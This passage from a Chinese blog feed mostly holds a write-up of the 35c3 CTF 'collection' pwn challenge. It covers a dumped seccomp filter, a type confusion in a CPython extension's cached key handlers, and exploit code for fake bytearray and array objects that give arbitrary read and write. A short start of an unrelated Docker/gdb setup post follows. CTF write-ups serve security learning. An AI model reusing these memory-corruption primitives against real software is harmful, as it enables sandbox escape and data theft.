0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0022: 0x15 0x00 0x01 0x00000003  <span class="keyword">if</span> (A != close) goto 0024</span><br><span class="line"> 0023: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0024: 0x15 0x00 0x01 0x00000001  <span class="keyword">if</span> (A != write) goto 0026</span><br><span class="line"> 0025: 0x05 0x00 0x00 0x00000037  goto 0081</span><br><span class="line"> 0026: 0x15 0x00 0x01 0x0000000d  <span class="keyword">if</span> (A != rt_sigaction) goto 0028</span><br><span class="line"> 0027: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0028: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"> 0029: 0x05 0x00 0x00 0x00000000  goto 0030</span><br><span class="line"> 0030: 0x20 0x00 0x00 0x00000010  A = args[0]</span><br><span class="line"> 0031: 0x02 0x00 0x00 0x00000000  mem[0] = A</span><br><span class="line"> 0032: 0x20 0x00 0x00 0x00000014  A = args[0] &gt;&gt; 32</span><br><span class="line"> 0033: 0x02 0x00 0x00 0x00000001  mem[1] = A</span><br><span class="line"> 0034: 0x15 0x00 0x03 0x00000000  <span class="keyword">if</span> (A != 0x0) goto 0038</span><br><span class="line"> 0035: 0x60 0x00 0x00 0x00000000  A = mem[0]</span><br><span class="line"> 0036: 0x15 0x02 0x00 0x00000000  <span class="keyword">if</span> (A == 0x0) goto 0039</span><br><span class="line"> 0037: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0038: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"> 0039: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0040: 0x20 0x00 0x00 0x00000020  A = args[2]</span><br><span class="line"> 0041: 0x02 0x00 0x00 0x00000000  mem[0] = A</span><br><span class="line"> 0042: 0x20 0x00 0x00 0x00000024  A = args[2] &gt;&gt; 32</span><br><span class="line"> 0043: 0x02 0x00 0x00 0x00000001  mem[1] = A</span><br><span class="line"> 0044: 0x15 0x00 0x03 0x00000000  <span class="keyword">if</span> (A != 0x0) goto 0048</span><br><span class="line"> 0045: 0x60 0x00 0x00 0x00000000  A = mem[0]</span><br><span class="line"> 0046: 0x15 0x02 0x00 0x00000003  <span class="keyword">if</span> (A == 0x3) goto 0049</span><br><span class="line"> 0047: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0048: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"> 0049: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0050: 0x20 0x00 0x00 0x00000028  A = args[3]</span><br><span class="line"> 0051: 0x02 0x00 0x00 0x00000000  mem[0] = A</span><br><span class="line"> 0052: 0x20 0x00 0x00 0x0000002c  A = args[3] &gt;&gt; 32</span><br><span class="line"> 0053: 0x02 0x00 0x00 0x00000001  mem[1] = A</span><br><span class="line"> 0054: 0x15 0x00 0x03 0x00000000  <span class="keyword">if</span> (A != 0x0) goto 0058</span><br><span class="line"> 0055: 0x60 0x00 0x00 0x00000000  A = mem[0]</span><br><span class="line"> 0056: 0x15 0x02 0x00 0x00000022  <span class="keyword">if</span> (A == 0x22) goto 0059</span><br><span class="line"> 0057: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0058: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"> 0059: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0060: 0x20 0x00 0x00 0x00000030  A = args[4]</span><br><span class="line"> 0061: 0x02 0x00 0x00 0x00000000  mem[0] = A</span><br><span class="line"> 0062: 0x20 0x00 0x00 0x00000034  A = args[4] &gt;&gt; 32</span><br><span class="line"> 0063: 0x02 0x00 0x00 0x00000001  mem[1] = A</span><br><span class="line"> 0064: 0x15 0x00 0x03 0x00000000  <span class="keyword">if</span> (A != 0x0) goto 0068</span><br><span class="line"> 0065: 0x60 0x00 0x00 0x00000000  A = mem[0]</span><br><span class="line"> 0066: 0x15 0x02 0x00 0xffffffff  <span class="keyword">if</span> (A == 0xffffffff) goto 0069</span><br><span class="line"> 0067: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0068: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"> 0069: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0070: 0x20 0x00 0x00 0x00000038  A = args[5]</span><br><span class="line"> 0071: 0x02 0x00 0x00 0x00000000  mem[0] = A</span><br><span class="line"> 0072: 0x20 0x00 0x00 0x0000003c  A = args[5] &gt;&gt; 32</span><br><span class="line"> 0073: 0x02 0x00 0x00 0x00000001  mem[1] = A</span><br><span class="line"> 0074: 0x15 0x00 0x03 0x00000000  <span class="keyword">if</span> (A != 0x0) goto 0078</span><br><span class="line"> 0075: 0x60 0x00 0x00 0x00000000  A = mem[0]</span><br><span class="line"> 0076: 0x15 0x02 0x00 0x00000000  <span class="keyword">if</span> (A == 0x0) goto 0079</span><br><span class="line"> 0077: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0078: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"> 0079: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0080: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0081: 0x05 0x00 0x00 0x00000000  goto 0082</span><br><span class="line"> 0082: 0x20 0x00 0x00 0x00000010  A = args[0]</span><br><span class="line"> 0083: 0x02 0x00 0x00 0x00000000  mem[0] = A</span><br><span class="line"> 0084: 0x20 0x00 0x00 0x00000014  A = args[0] &gt;&gt; 32</span><br><span class="line"> 0085: 0x02 0x00 0x00 0x00000001  mem[1] = A</span><br><span class="line"> 0086: 0x15 0x00 0x05 0x00000000  <span class="keyword">if</span> (A != 0x0) goto 0092</span><br><span class="line"> 0087: 0x60 0x00 0x00 0x00000000  A = mem[0]</span><br><span class="line"> 0088: 0x15 0x00 0x02 0x00000001  <span class="keyword">if</span> (A != 0x1) goto 0091</span><br><span class="line"> 0089: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0090: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0091: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0092: 0x15 0x00 0x05 0x00000000  <span class="keyword">if</span> (A != 0x0) goto 0098</span><br><span class="line"> 0093: 0x60 0x00 0x00 0x00000000  A = mem[0]</span><br><span class="line"> 0094: 0x15 0x00 0x02 0x00000002  <span class="keyword">if</span> (A != 0x2) goto 0097</span><br><span class="line"> 0095: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0096: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0097: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0098: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure><p>从中，我们可以大胆的猜测，我们需要构造一个任意读，通过 readv 读取flag 然后将其打印出来。</p><p>另外一点，由于编译后的Python结构体不全，我们可以通过一个方法：</p><p>（这个方法是丁老教我的）</p><p>这个方法中需要注意的是，对于正常的debug编译来说是没有类型信息的，需要使用<code>-g3</code>的debug编译等级，需要在编译python的时候：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;configure CFLAGS&#x3D;-g3</span><br><span class="line">make -j4</span><br></pre></td></tr></table></figure><p>这样就可以编译出带有type的python，然后用ida打开，选择<code>file -&gt; produce file -&gt; create C header</code>就可以导出到header，在逆向so库的这边把header导入就可以得到类型信息了。</p><p>在恢复完类型信息之后，我们就可以看看so库里定义的一些关键的接口了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">00000000002041E0</span>                 dq offset CollectionTypeMethod; tp_methods</span><br><span class="line">...</span><br><span class="line">.data:<span class="number">00000000002041E0</span>                 dq offset CollectionInit; tp_init</span><br><span class="line">.data:<span class="number">00000000002041E0</span>                 dq <span class="number">0</span>                    ; tp_alloc</span><br><span class="line">.data:<span class="number">00000000002041E0</span>                 dq offset CollectionNew ; tp_new</span><br></pre></td></tr></table></figure><p>接下来要注意的函数是new和init函数，因为它们是在初始化新的Collection对象时调用的第一个函数。总之，tp_new检查是否使用字典初始化了对象，并确保字典只有32个或更少的成员。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Collection</span><br><span class="line"></span><br><span class="line">a = Collection.Collection(&#123;<span class="string">&quot;a&quot;</span>:<span class="number">1337</span>, <span class="string">&quot;b&quot;</span>:[<span class="number">1.2</span>], <span class="string">&quot;c&quot;</span>:&#123;<span class="string">&quot;a&quot;</span>:<span class="number">45545</span>&#125;&#125;)</span><br><span class="line"></span><br><span class="line">print(a.get(<span class="string">&quot;a&quot;</span>))</span><br><span class="line">print(a.get(<span class="string">&quot;b&quot;</span>))</span><br><span class="line">print(a.get(<span class="string">&quot;c&quot;</span>))</span><br></pre></td></tr></table></figure><p>总结一下题目的基本逻辑：</p><ol><li>server中：设置py沙箱，打开flag，设置fd为1023然后启动用户的python程序。设置沙箱：这一步导致我们根本不用考虑去绕过python层的沙箱了，因为在<code>import Collection</code>的时候有<code>init_sandbox</code>操作，加入了seccomp，只能使用白名单，我主要在意了白名单里有<code>write</code>和<code>readv</code>，但是没有open。</li><li>有<code>Collection.Collection</code>对象，和该对象上的<code>.get</code>方法。对象初始化接受一个dict，dict的key必须为字符串，然后value为数值/list/dict中的一种。<code>.get</code>接受一个字符串，然后返回初始化时传入的内容。</li><li>在初始化时会建立一个<code>handler</code>，相当于key的缓存，会保存下传入的dict的key的内容（字符串内容）和类型（是整数还是列表还是字典），建立之后会存入缓存的handler里，如果存在“一样”的handler，就会直接使用该handler，而不新建。</li><li>handler的“一样”的比较，是将两个handler按照字典序排序，之后比较两个handler相应位置的key和类型是不是都一样，如果完全一样则一样，否则则不同</li><li>在<code>.get</code>的时候，首先从<code>handler</code>里找到对应key所在的索引，然后从对象里的<code>slots</code>里取出内容返回，如果是整数，还需要进行一次转换，将整数转换为python的整数对象类型。</li></ol><h2 id="Vul"><a href="#Vul" class="headerlink" title="Vul"></a>Vul</h2><p>看一个 PoC</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">root@linuxkit<span class="number">-025000000001</span> /pwn<span class="comment"># cat test.py</span></span><br><span class="line"><span class="keyword">import</span> Collection</span><br><span class="line"></span><br><span class="line"><span class="comment"># a = Collection.Collection(&#123;&quot;a&quot;:1337, &quot;b&quot;:[1.2], &quot;c&quot;:&#123;&quot;a&quot;:45545&#125;&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(a.get(&quot;a&quot;))</span></span><br><span class="line"><span class="comment"># print(a.get(&quot;b&quot;))</span></span><br><span class="line"><span class="comment"># print(a.get(&quot;c&quot;))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = Collection.Collection(&#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">3</span>&#125;)</span><br><span class="line">b = Collection.Collection(&#123;<span class="string">&#x27;b&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">3</span>&#125;)</span><br><span class="line"></span><br><span class="line">print(a.get(<span class="string">&quot;a&quot;</span>)) <span class="comment"># 1</span></span><br><span class="line">print(a.get(<span class="string">&quot;b&quot;</span>)) <span class="comment"># 2</span></span><br><span class="line">print(a.get(<span class="string">&quot;c&quot;</span>)) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">print(b.get(<span class="string">&#x27;a&#x27;</span>)) <span class="comment"># 1 ← should be 2</span></span><br><span class="line">print(b.get(<span class="string">&#x27;b&#x27;</span>)) <span class="comment"># 2 ← should be 1</span></span><br><span class="line">print(b.get(<span class="string">&#x27;c&#x27;</span>)) <span class="comment"># 3⏎                                                                                                     root@linuxkit-025000000001 /pwn# python3 test.py</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure><p>原本 a 被定义为：{‘a’: 1, ‘b’: 2, ‘c’: 3}</p><pre><code>   b 被定义为：&#123;&#39;b&#39;: 1, &#39;a&#39;: 2, &#39;c&#39;: 3&#125;</code></pre><p>那么本应该 b.get(‘a’)获取的应该是2 但是在这个时候缺拿到是 1 这是为什么？</p><p>不同对象的两个handler是经过排序的，排序之后认为相同，则就使用现有的handler了，但是事实上两个handler相同之后，他们的顺序可能是不同的，而后在<code>.get</code>的时候又用到了这个顺序，不同的顺序对应的索引肯定不同。</p><p>这样就造成了一个类似于类型混淆的点</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>我们尝试用<code>get()</code>返回一个我在内存中创建的伪造的Python列表对象。我希望这会让我通过List的内容任意写.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PyObject_VAR_HEAD</span><br><span class="line">    <span class="comment">/* Vector of pointers to list elements.  list[0] is ob_item[0], etc. */</span></span><br><span class="line">    PyObject **ob_item;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ob_item contains space for &#x27;allocated&#x27; elements.  The number</span></span><br><span class="line"><span class="comment">     * currently in use is ob_size.</span></span><br><span class="line"><span class="comment">     * Invariants:</span></span><br><span class="line"><span class="comment">     *     0 &lt;= ob_size &lt;= allocated</span></span><br><span class="line"><span class="comment">     *     len(list) == ob_size</span></span><br><span class="line"><span class="comment">     *     ob_item == NULL implies ob_size == allocated == 0</span></span><br><span class="line"><span class="comment">     * list.sort() temporarily sets allocated to -1 to detect mutations.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Items must normally not be NULL, except during construction when</span></span><br><span class="line"><span class="comment">     * the list is not yet visible outside the function that builds it.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Py_ssize_t allocated;</span><br><span class="line">&#125; PyListObject;</span><br></pre></td></tr></table></figure><p>然后丁老意识到，用list做任意读写并不现实，那么我们需要找一个能够直接写入值而非对象的类型。之前都想到bytes了，现在需要他可以更改，那就bytearray。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PyObject_VAR_HEAD</span><br><span class="line">    Py_ssize_t ob_alloc; <span class="comment">/* How many bytes allocated in ob_bytes */</span></span><br><span class="line">    <span class="keyword">char</span> *ob_bytes;      <span class="comment">/* Physical backing buffer */</span></span><br><span class="line">    <span class="keyword">char</span> *ob_start;      <span class="comment">/* Logical start inside ob_bytes */</span></span><br><span class="line">    <span class="comment">/* XXX(nnorwitz): should ob_exports be Py_ssize_t? */</span></span><br><span class="line">    <span class="keyword">int</span> ob_exports;      <span class="comment">/* How many buffer exports */</span></span><br><span class="line">&#125; PyByteArrayObject;</span><br></pre></td></tr></table></figure><p>看到<code>ob_bytes</code>大家应该就放心了，这直接就是一个缓冲区，可以直接更改，size也可控，所以如果能伪造一个bytearray，就可以任意读写了。</p><p>所以总结一下思路：</p><ol><li>建立一个目标bytearray</li><li>利用bytes伪造一个list，<code>id(X) + 0x20</code>即为写入的bytes内容的地址（这个可以调试得到），指针数组设置为bytearray地址的<code>ob_bytes</code>位置</li><li>利用构造的list，将一个新的bytearray的地址写入到第一步中的bytearray的<code>ob_bytes</code>和<code>ob_start</code>位置</li><li>这样就已经做到任意读写了，每次修改第一步的bytearray，让他的内容是一个伪造的bytearray，地址指向需要读写的地址，然后使用第三步的进行读写</li></ol><p>后来丁老意识到 我们需要绕一下 bytearary 和 list ,方法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">subs = [].__class__.mro()[<span class="number">1</span>].__subclasses__()</span><br><span class="line"><span class="keyword">for</span> cls <span class="keyword">in</span> subs:</span><br><span class="line">    <span class="keyword">if</span> cls.__name__ == <span class="string">&#x27;bytearray&#x27;</span>:</span><br><span class="line">        bytearray = cls</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> cls.__name__ == <span class="string">&#x27;list&#x27;</span>:</span><br><span class="line">        list = cls</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> cls.__name__ == <span class="string">&#x27;bytes&#x27;</span>:</span><br><span class="line">        bytes = cls</span><br></pre></td></tr></table></figure><p>之后我们就可以去构造我们的任意读写：</p><figure class="highlight plain"><figcaption><span>set_addr(addr):</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">    payload &#x3D; p64(0x10) + p64(id(bytearray)) + p64(0x1000) + p64(0x1001) + \</span><br><span class="line">            p64(addr) + p64(addr)</span><br><span class="line">    for i in range(6 * 8):</span><br><span class="line">        buf[i] &#x3D; payload[i]</span><br><span class="line"></span><br><span class="line">def arbitrary_read(addr, length):</span><br><span class="line">    set_addr(addr) </span><br><span class="line"></span><br><span class="line">    assert length &lt; 0x1000 # can be larger, but .. really?</span><br><span class="line">    return some[:length]</span><br><span class="line"></span><br><span class="line">def arbitrary_write(addr, length, buf):</span><br><span class="line">    set_addr(addr)</span><br><span class="line"></span><br><span class="line">    for i in range(length):</span><br><span class="line">        some[i] &#x3D; buf[i]</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">之后呢，有了任意读写之后就很简单了，有了打开的flag的fd，有&#96;readv&#96;和&#96;write&#96;，构造好数据进行读取即可。接着构造一个rop。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">完整EXP见 35c3CTF [collection writeup](https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;3747)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">值得一提的是，在调试的过程中，gdb set stop-on-solib-events 1就能断下来。</span><br><span class="line"></span><br><span class="line">另外在结束后，我也看了一下作者的 [exploit](https:&#x2F;&#x2F;github.com&#x2F;bkth&#x2F;35c3ctf&#x2F;blob&#x2F;master&#x2F;collection&#x2F;dist_exploit.py) ，作者这里用了 array.array 这样的一个对象</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​&#96;&#96;&#96;c</span><br><span class="line">typedef struct &#123;</span><br><span class="line">    typedef struct arrayobject &#123;</span><br><span class="line">    PyObject_VAR_HEAD</span><br><span class="line">    char *ob_item;  &#x2F;&#x2F; &lt;- Make this point to the address you want to read&#x2F;write</span><br><span class="line">    Py_ssize_t allocated;</span><br><span class="line">    const struct arraydescr *; &#x2F;&#x2F; &lt;- Make this point to &quot;L&quot; for long</span><br><span class="line">    PyObject *weakreflist;</span><br><span class="line">    int ob_exports;</span><br><span class="line">&#125; arrayobject;</span><br></pre></td></tr></table></figure><p>它与List有一些相似之处，但关于这种类型的重要一点是它的内容存储为C类型而不是Python对象！有了这个，任意读写都会非常容易</p><p>因此就没有了起那么的那些类型绕过：</p><p>作者的 任意读写如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">addr</span>):</span></span><br><span class="line">    d = &#123;&#125;</span><br><span class="line">    d[<span class="string">&quot;a1&quot;</span>] = <span class="number">0x1</span></span><br><span class="line">    d[<span class="string">&quot;a2&quot;</span>] = <span class="number">0x9d3340</span></span><br><span class="line">    d[<span class="string">&quot;a3&quot;</span>] = <span class="number">0x4</span></span><br><span class="line">    d[<span class="string">&quot;a4&quot;</span>] = addr</span><br><span class="line">    d[<span class="string">&quot;a5&quot;</span>] = <span class="number">0x4</span></span><br><span class="line">    d[<span class="string">&quot;a6&quot;</span>] = <span class="number">0x715620</span></span><br><span class="line">    d[<span class="string">&quot;a7&quot;</span>] = <span class="number">0x0</span></span><br><span class="line">    d[<span class="string">&quot;a8&quot;</span>] = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x7ffff6153db0:0x00000000000000010x00000000009ef7a0</span></span><br><span class="line">    <span class="comment"># 0x7ffff6153dc0:0x00000000000000040x00007ffff6191790</span></span><br><span class="line">    <span class="comment"># 0x7ffff6153dd0:0x00000000000000040x0000000000644a50</span></span><br><span class="line">    <span class="comment"># 0x7ffff6153de0:0x00000000000000000x0000000000000000</span></span><br><span class="line">    fakeContainer = Collection.Collection(d)</span><br><span class="line"></span><br><span class="line">    collAddr = id(fakeContainer)</span><br><span class="line">    fakeArr = collAddr + <span class="number">24</span></span><br><span class="line"></span><br><span class="line">    a = Collection.Collection(&#123;<span class="string">&quot;a&quot;</span>:<span class="number">1337</span>, <span class="string">&quot;b&quot;</span>:[<span class="number">1.2</span>]&#125;)</span><br><span class="line">    b = Collection.Collection(&#123;<span class="string">&quot;b&quot;</span>:[<span class="number">1.3</span>], <span class="string">&quot;a&quot;</span>:fakeArr&#125;)</span><br><span class="line">    fakeobj = b.get(<span class="string">&quot;b&quot;</span>)</span><br><span class="line">    roots.append(fakeobj)</span><br><span class="line">    <span class="keyword">return</span> fakeobj[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">addr, val</span>):</span></span><br><span class="line">    d = &#123;&#125;</span><br><span class="line">    d[<span class="string">&quot;a1&quot;</span>] = <span class="number">0x1</span></span><br><span class="line">    d[<span class="string">&quot;a2&quot;</span>] = <span class="number">0x9d3340</span></span><br><span class="line">    d[<span class="string">&quot;a3&quot;</span>] = <span class="number">0x4</span></span><br><span class="line">    d[<span class="string">&quot;a4&quot;</span>] = addr</span><br><span class="line">    d[<span class="string">&quot;a5&quot;</span>] = <span class="number">0x4</span></span><br><span class="line">    d[<span class="string">&quot;a6&quot;</span>] = <span class="number">0x715620</span></span><br><span class="line">    d[<span class="string">&quot;a7&quot;</span>] = <span class="number">0x0</span></span><br><span class="line">    d[<span class="string">&quot;a8&quot;</span>] = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x7ffff6153db0:0x00000000000000010x00000000009ef7a0</span></span><br><span class="line">    <span class="comment"># 0x7ffff6153dc0:0x00000000000000040x00007ffff6191790</span></span><br><span class="line">    <span class="comment"># 0x7ffff6153dd0:0x00000000000000040x0000000000644a50</span></span><br><span class="line">    <span class="comment"># 0x7ffff6153de0:0x00000000000000000x0000000000000000</span></span><br><span class="line">    fakeContainer = Collection.Collection(d)</span><br><span class="line"></span><br><span class="line">    collAddr = id(fakeContainer)</span><br><span class="line">    fakeArr = collAddr + <span class="number">24</span></span><br><span class="line"></span><br><span class="line">    a = Collection.Collection(&#123;<span class="string">&quot;a&quot;</span>:<span class="number">1337</span>, <span class="string">&quot;b&quot;</span>:[<span class="number">1.2</span>]&#125;)</span><br><span class="line">    b = Collection.Collection(&#123;<span class="string">&quot;b&quot;</span>:[<span class="number">1.3</span>], <span class="string">&quot;a&quot;</span>:fakeArr&#125;)</span><br><span class="line">    fakeobj = b.get(<span class="string">&quot;b&quot;</span>)</span><br><span class="line">    roots.append(fakeobj)</span><br><span class="line">    fakeobj[<span class="number">0</span>] = val</span><br></pre></td></tr></table></figure><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://xz.aliyun.com/t/3747">https://xz.aliyun.com/t/3747</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> Python </tag>
            
            <tag> 35c3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker for Mac and gdb GUI windows</title>
      <link href="Docker-for-Mac-and-run-gdb-GUI-window.html"/>
      <url>Docker-for-Mac-and-run-gdb-GUI-window.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p> Docker for Mac and GUI applications and gdb GUI windows</p><p>我为啥有这需求呢？ 以前 Pwntools + gdb.attach 进行调试的时候我用过一段时间的 tmux</p><p>像下面这样：</p><p>先在 Python 脚本加上 <code>context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]</code></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/tmux-gdb.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/tmux-gdb.png"></a> </p><p>顺便一提我 tmux 的设置如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 